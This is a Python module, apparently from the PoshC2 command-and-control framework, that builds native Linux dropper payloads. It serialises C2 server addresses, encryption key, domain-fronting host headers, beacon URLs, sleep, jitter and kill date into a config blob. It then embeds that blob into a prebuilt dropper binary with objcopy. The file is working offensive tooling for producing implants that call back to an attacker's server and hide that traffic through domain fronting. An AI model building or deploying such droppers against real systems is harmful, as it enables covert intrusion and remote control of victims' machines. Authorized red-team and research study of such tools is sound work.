"""

Script to compile the Native Linux payloads

"""
import time
from datetime import datetime
from subprocess import Popen
from urllib.parse import urlparse

from poshc2 import Colours
from poshc2.server.Config import PayloadTemplatesDirectory, Jitter


def create_payloads(payloads, name):
    payloads.quickstart_log(Colours.END)
    payloads.quickstart_log("Linux files:")

    # Serialize our config data in a way that can be embedded into the resource section of the dropper binary
    # Arrays of items are represented by repeated keys (e.g. domain_front_header=header1.google.com\0domain_front_header=header2.google.com
    # the overall string MUST be null terminated
    # For now, ints and floats are represented as strings, might be good to serialise them (with struct?) in the future

    # Even if domain fronting hasn't been setup by the user, we need to set a 'domain-front-header' per C2 comms host as otherwise Curl sends requests with an empty hosts header
    # and that breaks things...

    # The basic logic is to loop through each server that is set, and see if there's a matching domain front header.
    # If not, extract the netloc from the URL (e.g. the domain) and use that
    servers = payloads.payload_comms_host.split(",")
    domain_front_headers = payloads.domain_front_header.split(",")

    host_headers = []
    for i in range(0, len(servers)):
        try:
            dfh_len = len(domain_front_headers[i].replace("\"", ""))
        except IndexError:
            dfh_len = 0
            pass

        if dfh_len == 0:
            host_headers.append(urlparse(servers[i].replace("\"", "")).hostname)
        # A host header was set - so use that instead
        else:
            host_headers.append(domain_front_headers[i])

    mapping = {
        "key=": payloads.encryption_key,
        "urlid=": payloads.url_id,
        "url_suffix2=": payloads.connect_url + "?e",
        "domain_front_hdr=": host_headers,
        "server_clean=": payloads.payload_comms_host.split(","),
        "ua=": payloads.user_agent,
        "proxy_url=": payloads.proxy_url,
        "proxy_user=": payloads.proxy_user,
        "proxy_pass=": payloads.proxy_password,
        "urls=": payloads.all_beacon_urls.split(","),
        "jitter=": Jitter,
        "sleep_time=": payloads.sleep.replace("s", ""),
        "kill_date=": int(time.mktime(datetime.strptime(payloads.kill_date, "%Y-%m-%d").timetuple())),
        "icoimage=": payloads.all_beacon_images.split(","),
    }

    config_string = ''

    for element in mapping:
        if isinstance(mapping[element], list):
            for item in mapping[element]:
                config_string += element
                config_string += str(item).replace("\"", "").strip()
                config_string += "\x00"
        else:
            config_string += element
            config_string += str(mapping[element]).replace("\"", "").strip()
            config_string += "\x00"

    config_string += "CONFIG_END\x00"

    with open(f'{payloads.output_directory}/linux_config.bin', 'w') as f:
        f.write(config_string)

    proc = Popen(
        f'objcopy --update-section .configuration={payloads.output_directory}/linux_config.bin {PayloadTemplatesDirectory}/dropper {payloads.output_directory}{name}native_dropper',
        shell=True)
    return_code = proc.wait()

    if return_code != 0:
        payloads.quickstart_log('Error creating native linux payload')
    else:
        payloads.quickstart_log(f'Linux dropper written to {payloads.output_directory}{name}native_dropper')
